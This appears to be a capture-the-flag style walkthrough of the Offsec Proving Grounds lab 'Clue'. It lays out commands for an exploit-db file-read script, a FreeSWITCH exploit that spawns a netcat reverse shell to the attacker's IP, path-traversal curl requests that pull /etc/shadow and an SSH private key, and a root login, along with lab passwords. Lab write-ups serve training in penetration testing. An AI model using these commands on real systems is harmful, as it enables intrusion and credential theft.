---
title: Clue
date: 2026-04-25T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - searchsploit
  - linpeas
  - curl
  - ssh
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Clue"
aliases:
  - "`"
---
 "It's not what happens to you, but how you react to it that matters." 
– Epictetus

![](Screenshot%202026-04-20%20at%2019.56.06.png)

Looking for bites....

![](Screenshot%202026-04-20%20at%2019.56.41.png)

![](Screenshot%202026-04-20%20at%2019.56.59.png)

![](Screenshot%202026-04-20%20at%2020.02.49.png)

http always first....

![](Screenshot%202026-04-20%20at%2020.09.17.png)

![](Screenshot%202026-04-20%20at%2020.12.17.png)

https://github.com/avalanche123/cassandra-web

![](Screenshot%202026-04-20%20at%2020.15.37.png)

python 49362.py 192.168.133.240 -p 3000  /etc/passwd

![](Screenshot%202026-04-20%20at%2020.21.49.png)

3 users with logon: cassie, freeswitch and anthony... 

![](Screenshot%202026-04-20%20at%2020.25.12.png)

![](Screenshot%202026-04-21%20at%2010.41.57.png)

StrongClueConEight021

https://www.exploit-db.com/exploits/47799

![](Screenshot%202026-04-26%20at%2009.30.24.png)

Change the default password "ClueCon" to the retrieved password:  
`StrongClueConEight021`

![](Screenshot%202026-04-21%20at%2010.43.57.png)

![](Screenshot%202026-04-21%20at%2010.44.32.png)

Set up a listener:  
`rlwarp nc -lvnp`

`python 47799.txt  192.168.171.240 "nc 192.168.45.195 80 -e /bin/bash"`

![](Screenshot%202026-04-21%20at%2011.01.47.png)

![](Screenshot%202026-04-21%20at%2011.01.03.png)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](Screenshot%202026-04-21%20at%2011.04.13.png)

![](Screenshot%202026-04-21%20at%2011.05.45.png)

 Move linpeas.sh onto the victim machine:  
kali - type: `linpeas` then: `updog -p 80`  
victim - `curl http://192.168.45.165/linpeas.sh`

![](Screenshot%202026-04-21%20at%2015.26.23.png)
 ![](Screenshot%202026-04-21%20at%2015.25.33.png)

cassie:SecondBiteTheApple330

Sign in as cassie:  
`su cassie`

`sudo -l`

![](Screenshot%202026-04-21%20at%2016.17.45.png)

😈 This means we can run the server with root, currently its running on port 3000 with cassie as the owner.

![](Screenshot%202026-04-21%20at%2016.18.17.png)

Cassandra-web, rubygems application

Start the application on a different port:  
`sudo /usr/local/bin/cassandra-web -B 127.0.0.1:3001 -u cassie -p SecondBiteTheApple330  &` 

I tried to set up a tunnel to use the previously used cassandra python exploit but was unable to connect to the agent.

I found this in a guide:  
`curl --path-as-is http://localhost:3001/../../../../../../../../../etc/shadow`

![](Screenshot%202026-04-22%20at%2007.00.48.png)

sha512 will take too long to crack....

![](Screenshot%202026-04-22%20at%2007.53.54.png)

![](Screenshot%202026-04-22%20at%2007.29.47.png)

curl --path-as-is http://localhost:3001/../../../../../../../../../../home/anthony/.ssh/id_rsa

![](Screenshot%202026-04-22%20at%2007.29.04.png)

Copy this key into a file on your kali machine. 

`ssh root@192.68.231.240 -i root`

![](Screenshot%202026-04-22%20at%2007.28.33.png)